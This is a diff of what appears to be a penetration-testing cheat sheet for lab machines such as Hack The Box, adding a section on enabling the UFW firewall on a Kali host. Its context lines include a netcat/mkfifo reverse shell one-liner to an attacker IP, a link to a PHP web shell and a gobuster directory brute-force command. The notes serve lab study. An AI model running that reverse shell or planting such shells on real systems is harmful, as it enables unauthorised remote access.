@@ -172,6 +172,25 @@ https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php
 #to launch a shell use
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.xx 666 >/tmp/f
 
+
+
+##########################FIREWALL#######################
+# on kali you can use UFW or IPTABLES to protect your attackers machine
+
+#install UFW
+
+apt-get install ufw
+
+#show the status
+ufw status
+#reset ufw to defaults
+ufw reset
+
+#enable the firewall
+ufw enable
+
+
+
 #########################GOBUSTER######################
 ### gobuster general command structure for a lnux server running PHP connecting via a proxy
 gobuster -u http://bank.htb -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html -p http://127.0.0.1:8080
